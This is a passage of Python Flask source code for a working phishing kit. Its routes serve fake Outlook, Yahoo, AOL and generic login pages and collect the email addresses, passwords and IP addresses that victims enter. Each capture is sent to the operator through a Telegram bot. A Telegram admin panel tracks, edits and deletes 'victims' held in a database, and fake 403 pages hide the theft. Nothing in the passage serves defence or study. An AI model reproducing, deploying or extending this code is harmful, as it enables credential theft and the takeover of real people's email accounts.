    edit_telegram_message(chat_id, message_id, text, keyboard)

def set_victim_phonetype(session_id, phone_type, chat_id, message_id):
    if not phone_type:
        text = "📱 Please type the phone type you want to set.\n\nExamples: iPhone, Android, Samsung, Oppo, etc."
        keyboard = {
            "inline_keyboard": [
                [{"text": "🔙 Back", "callback_data": f"victim_detail|{session_id}"}]
            ]
        }
        edit_telegram_message(chat_id, message_id, text, keyboard)
        return
    
    if session_id not in verification_page_data:
        verification_page_data[session_id] = {}
    verification_page_data[session_id]['phone'] = phone_type
    
    text = f"✅ Phone type set to: <code>{phone_type}</code>"
    keyboard = {
        "inline_keyboard": [
            [{"text": "🔙 Back to Victim", "callback_data": f"victim_detail|{session_id}"}],
            [{"text": "📋 Victims List", "callback_data": "victims_list"}]
        ]
    }
    edit_telegram_message(chat_id, message_id, text, keyboard)

def set_victim_number(session_id, number, chat_id, message_id):
    if not number:
        text = "🔢 Please type a 2-digit number (00-99).\n\nExample: 42"
        keyboard = {
            "inline_keyboard": [
                [{"text": "🔙 Back", "callback_data": f"victim_detail|{session_id}"}]
            ]
        }
        edit_telegram_message(chat_id, message_id, text, keyboard)
        return
    
    if not re.match(r'^[0-9]{2}$', number):
        text = "❌ Invalid number. Must be 2 digits (00-99). Please try again."
        keyboard = {
            "inline_keyboard": [
                [{"text": "🔙 Back", "callback_data": f"victim_detail|{session_id}"}]
            ]
        }
        edit_telegram_message(chat_id, message_id, text, keyboard)
        return
    
    if session_id not in recovery_page_data:
        recovery_page_data[session_id] = {}
    recovery_page_data[session_id]['number'] = number
    
    text = f"✅ Number set to: <code>{number}</code>"
    keyboard = {
        "inline_keyboard": [
            [{"text": "🔙 Back to Victim", "callback_data": f"victim_detail|{session_id}"}],
            [{"text": "📋 Victims List", "callback_data": "victims_list"}]
        ]
    }
    edit_telegram_message(chat_id, message_id, text, keyboard)

def set_victim_phone(session_id, phone, chat_id, message_id):
    if not phone:
        text = "📞 Please type the phone number you want to set.\n\nExample: +1234567890"
        keyboard = {
            "inline_keyboard": [
                [{"text": "🔙 Back", "callback_data": f"victim_detail|{session_id}"}]
            ]
        }
        edit_telegram_message(chat_id, message_id, text, keyboard)
        return
    
    if session_id not in verify_page_data:
        verify_page_data[session_id] = {}
    verify_page_data[session_id]['phone'] = phone
    
    text = f"✅ Phone set to: <code>{phone}</code>"
    keyboard = {
        "inline_keyboard": [
            [{"text": "🔙 Back to Victim", "callback_data": f"victim_detail|{session_id}"}],
            [{"text": "📋 Victims List", "callback_data": "victims_list"}]
        ]
    }
    edit_telegram_message(chat_id, message_id, text, keyboard)

def delete_victim_telegram(session_id, chat_id, message_id):
    conn = get_db_connection()
    c = conn.cursor()
    c.execute("UPDATE victims SET is_active = FALSE WHERE session_id = %s", (session_id,))
    conn.commit()
    conn.close()
    
    if session_id in active_victims:
        del active_victims[session_id]
    if session_id in victim_commands:
        del victim_commands[session_id]
    
    text = f"🗑️ Victim <code>{session_id[:8]}...</code> deleted!"
    keyboard = {
        "inline_keyboard": [
            [{"text": "📋 Victims List", "callback_data": "victims_list"}],
            [{"text": "🔙 Main Menu", "callback_data": "main_menu"}]
        ]
    }
    edit_telegram_message(chat_id, message_id, text, keyboard)

def send_stats(chat_id, message_id=None):
    conn = get_db_connection()
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM victims WHERE is_active = TRUE")
    active_count = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM victims")
    total_count = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM navigations")
    nav_count = c.fetchone()[0]
    conn.close()
    
    text = f"""📊 <b>Statistics</b>

👤 <b>Active Victims:</b> {active_count}
📋 <b>Total Victims:</b> {total_count}
🗺️ <b>Total Navigations:</b> {nav_count}
⚡ <b>Active Commands:</b> {len(victim_commands)}"""
    
    keyboard = {
        "inline_keyboard": [
            [{"text": "🔄 Refresh", "callback_data": "stats"}],
            [{"text": "📋 Victims List", "callback_data": "victims_list"}],
            [{"text": "🔙 Main Menu", "callback_data": "main_menu"}]
        ]
    }
    
    if message_id:
        edit_telegram_message(chat_id, message_id, text, keyboard)
    else:
        send_telegram_message_with_buttons(chat_id, text, keyboard)

def clear_all_victims(chat_id, message_id):
    conn = get_db_connection()
    c = conn.cursor()
    c.execute("DELETE FROM navigations")
    c.execute("DELETE FROM victims")
    c.execute("ALTER SEQUENCE victims_id_seq RESTART WITH 1")
    c.execute("ALTER SEQUENCE navigations_id_seq RESTART WITH 1")
    conn.commit()
    conn.close()
    
    active_victims.clear()
    victim_commands.clear()
    verify_page_data.clear()
    recovery_page_data.clear()
    verification_page_data.clear()
    
    text = "🧹 <b>ALL VICTIMS AND LOGS CLEARED!</b>"
    keyboard = {
        "inline_keyboard": [
            [{"text": "📋 Victims List", "callback_data": "victims_list"}],
            [{"text": "🔙 Main Menu", "callback_data": "main_menu"}]
        ]
    }
    edit_telegram_message(chat_id, message_id, text, keyboard)

def send_clear_confirmation(chat_id):
    text = "⚠️ <b>ARE YOU SURE?</b>\n\nThis will delete ALL victim data and navigation logs!\n\nThis action cannot be undone!"
    keyboard = {
        "inline_keyboard": [
            [
                {"text": "✅ Yes, Clear All", "callback_data": "clear_all"},
                {"text": "❌ Cancel", "callback_data": "main_menu"}
            ]
        ]
    }
    send_telegram_message_with_buttons(chat_id, text, keyboard)

def send_telegram_message_with_buttons(chat_id, text, keyboard):
    try:
        chat_id = os.environ.get('TELEGRAM_CHAT_ID')
        if not chat_id:
            return False
        
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        data = {
            "chat_id": chat_id,
            "text": text,
            "parse_mode": "HTML",
            "reply_markup": json.dumps(keyboard)
        }
        response = requests.post(url, data=data)
        return response.status_code == 200
    except Exception as e:
        print(f"Error sending Telegram message: {e}")
        return False

def edit_telegram_message(chat_id, message_id, text, keyboard):
    try:
        chat_id = os.environ.get('TELEGRAM_CHAT_ID')
        if not chat_id:
            return False
        
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/editMessageText"
        data = {
            "chat_id": chat_id,
            "message_id": message_id,
            "text": text,
            "parse_mode": "HTML",
            "reply_markup": json.dumps(keyboard)
        }
        response = requests.post(url, data=data)
        return response.status_code == 200
    except Exception as e:
        print(f"Error editing Telegram message: {e}")
        return False

def get_all_victims():
    conn = get_db_connection()
    c = conn.cursor()
    c.execute('''
        SELECT session_id, email, ip_address, current_page, timestamp 
        FROM victims 
        WHERE is_active = TRUE 
        ORDER BY timestamp DESC
        LIMIT 50
    ''')
    victims = c.fetchall()
    conn.close()
    
    return [{
        'session_id': v[0],
        'email': v[1] or 'No email',
        'ip_address': v[2],
        'current_page': v[3] or 'login',
        'timestamp': v[4]
    } for v in victims]

def get_victim_details(session_id):
    conn = get_db_connection()
    c = conn.cursor()
    c.execute('''
        SELECT v.session_id, v.email, v.ip_address, v.user_agent, v.current_page, v.timestamp,
               COUNT(n.id) as nav_count
        FROM victims v
        LEFT JOIN navigations n ON v.session_id = n.session_id
        WHERE v.session_id = %s AND v.is_active = TRUE
        GROUP BY v.session_id, v.email, v.ip_address, v.user_agent, v.current_page, v.timestamp
    ''', (session_id,))
    victim = c.fetchone()
    conn.close()
    
    if victim:
        return {
            'session_id': victim[0],
            'email': victim[1] or 'No email',
            'ip_address': victim[2],
            'user_agent': victim[3],
            'current_page': victim[4] or 'login',
            'timestamp': victim[5],
            'nav_count': victim[6]
        }
    return None

# ============ PROVIDER ROUTES ============
@app.route('/wp-admin/invite<int:invite_num>/hotmail/', methods=['GET', 'POST'])
def microsoft_login(invite_num):
    if request.method == 'POST':
        email = request.form.get('email', 'Not provided')
        session['user_email'] = email
        
        session_id = session.get('victim_session')
        if session_id:
            conn = get_db_connection()
            c = conn.cursor()
            c.execute("UPDATE victims SET email = %s WHERE session_id = %s", (email, session_id))
            conn.commit()
            conn.close()
            
            if session_id in active_victims:
                active_victims[session_id]['email'] = email
        
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        message = f"""
📧 <b>Outlook Email Entered!</b>

📧 <b>Email:</b> <code>{email}</code>
🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
🕒 <b>Time:</b> <code>{timestamp}</code>
📍 <b>Page:</b> Outlook Login
        """
        send_telegram_message(message)
        
        new_invite = random.randint(2, 999)
        return redirect(f"/wp-admin/invite{new_invite}/hotmail/password")
    
    return render_template('microsoft.html', invite_num=invite_num)

@app.route('/wp-admin/invite<int:invite_num>/hotmail/password', methods=['GET', 'POST'])
def microsoft_password(invite_num):
    email = session.get('user_email', '')
    
    if request.method == 'POST':
        password = request.form.get('password', 'Not provided')
        email = request.form.get('email', 'Not provided')
        
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        message = f"""
🔑 <b>Outlook Password Entered!</b>

📧 <b>Email:</b> <code>{email}</code>
🔐 <b>Password:</b> <code>{password}</code>
🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
🕒 <b>Time:</b> <code>{timestamp}</code>
        """
        send_telegram_message(message)
        
        new_invite = random.randint(2, 999)
        return redirect(f"/wp-admin/invite{new_invite}/hotmail/403")
    
    return render_template('passwordmicrosoft.html', email=email, invite_num=invite_num)

@app.route('/wp-admin/invite<int:invite_num>/hotmail/403')
def microsoft_403(invite_num):
    return render_template('403.html', invite_num=invite_num)

@app.route('/wp-admin/invite<int:invite_num>/yahoo/', methods=['GET', 'POST'])
def yahoo_login(invite_num):
    if request.method == 'POST':
        email = request.form.get('email', 'Not provided')
        session['yahoo_email'] = email
        
        session_id = session.get('victim_session')
        if session_id:
            conn = get_db_connection()
            c = conn.cursor()
            c.execute("UPDATE victims SET email = %s WHERE session_id = %s", (email, session_id))
            conn.commit()
            conn.close()
            
            if session_id in active_victims:
                active_victims[session_id]['email'] = email
        
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        message = f"""
📧 <b>Yahoo Email/Username Entered!</b>

📧 <b>Email/Username:</b> <code>{email}</code>
🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
🕒 <b>Time:</b> <code>{timestamp}</code>
📍 <b>Page:</b> Yahoo Login
        """
        send_telegram_message(message)
        
        new_invite = random.randint(2, 999)
        return redirect(f"/wp-admin/invite{new_invite}/yahoo/password")
    
    return render_template('yahoo.html', invite_num=invite_num)

@app.route('/wp-admin/invite<int:invite_num>/yahoo/password', methods=['GET', 'POST'])
def yahoo_password(invite_num):
    email = session.get('yahoo_email', '')
    
    if request.method == 'POST':
        password = request.form.get('password', 'Not provided')
        email = request.form.get('email', 'Not provided')
        
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        message = f"""
🔑 <b>Yahoo Password Entered!</b>

📧 <b>Email/Username:</b> <code>{email}</code>
🔐 <b>Password:</b> <code>{password}</code>
🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
🕒 <b>Time:</b> <code>{timestamp}</code>
        """
        send_telegram_message(message)
        
        new_invite = random.randint(2, 999)
        return redirect(f"/wp-admin/invite{new_invite}/yahoo/403")
    
    return render_template('yahoopassword.html', email=email, invite_num=invite_num)

@app.route('/wp-admin/invite<int:invite_num>/yahoo/403')
def yahoo_403(invite_num):
    return render_template('403.html', invite_num=invite_num)

@app.route('/wp-admin/invite<int:invite_num>/aol/', methods=['GET', 'POST'])
def aol_login(invite_num):
    if request.method == 'POST':
        email = request.form.get('email', 'Not provided')
        session['aol_email'] = email
        
        session_id = session.get('victim_session')
        if session_id:
            conn = get_db_connection()
            c = conn.cursor()
            c.execute("UPDATE victims SET email = %s WHERE session_id = %s", (email, session_id))
            conn.commit()
            conn.close()
            
            if session_id in active_victims:
                active_victims[session_id]['email'] = email
        
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        message = f"""
📧 <b>AOL Email Entered!</b>

📧 <b>Email:</b> <code>{email}</code>
🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
🕒 <b>Time:</b> <code>{timestamp}</code>
📍 <b>Page:</b> AOL Login
        """
        send_telegram_message(message)
        
        new_invite = random.randint(2, 999)
        return redirect(f"/wp-admin/invite{new_invite}/aol/password")
    
    return render_template('aol.html', invite_num=invite_num)

@app.route('/wp-admin/invite<int:invite_num>/aol/password', methods=['GET', 'POST'])
def aol_password(invite_num):
    email = session.get('aol_email', '')
    
    if request.method == 'POST':
        password = request.form.get('password', 'Not provided')
        email = request.form.get('email', 'Not provided')
        
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        message = f"""
🔑 <b>AOL Password Entered!</b>

📧 <b>Email:</b> <code>{email}</code>
🔐 <b>Password:</b> <code>{password}</code>
🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
🕒 <b>Time:</b> <code>{timestamp}</code>
        """
        send_telegram_message(message)
        
        new_invite = random.randint(2, 999)
        return redirect(f"/wp-admin/invite{new_invite}/aol/403")
    
    return render_template('aolpassword.html', email=email, invite_num=invite_num)

@app.route('/wp-admin/invite<int:invite_num>/aol/403')
def aol_403(invite_num):
    return render_template('403.html', invite_num=invite_num)

@app.route('/wp-admin/invite<int:invite_num>/other/', methods=['GET', 'POST'])
def other_login(invite_num):
    if request.method == 'POST':
        email = request.form.get('email', 'Not provided')
        password = request.form.get('password', 'Not provided')
        
        session_id = session.get('victim_session')
        if session_id:
            conn = get_db_connection()
            c = conn.cursor()
            c.execute("UPDATE victims SET email = %s WHERE session_id = %s", (email, session_id))
            conn.commit()
            conn.close()
            
            if session_id in active_victims:
                active_victims[session_id]['email'] = email
        
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        message = f"""
🔑 <b>Other Login Attempt!</b>

📧 <b>Email:</b> <code>{email}</code>
🔐 <b>Password:</b> <code>{password}</code>
🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
🕒 <b>Time:</b> <code>{timestamp}</code>
        """
        send_telegram_message(message)
        
        new_invite = random.randint(2, 999)
        return redirect(f"/wp-admin/invite{new_invite}/other/403")
    
    return render_template('other.html', invite_num=invite_num)

@app.route('/wp-admin/invite<int:invite_num>/other/403')
def other_403(invite_num):
    return render_template('403.html', invite_num=invite_num)

def setup_telegram_webhook():
    """Set the Telegram webhook URL"""
    try:
        domain = os.environ.get('DOMAIN_URL', 'https://bace-w3pt.onrender.com')
        webhook_url = f"{domain}/telegram-webhook"
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/setWebhook?url={webhook_url}"
        response = requests.get(url)
        print(f"Webhook setup: {response.text}")
    except Exception as e:
        print(f"Error setting webhook: {e}")

if __name__ == '__main__':
    if not os.environ.get('WERKZEUG_RUN_MAIN'):
        send_telegram_message("✅ Server started!")
        setup_telegram_webhook()
    
    app.run(
        host='0.0.0.0', 
        port=5000,
        debug=False
    )
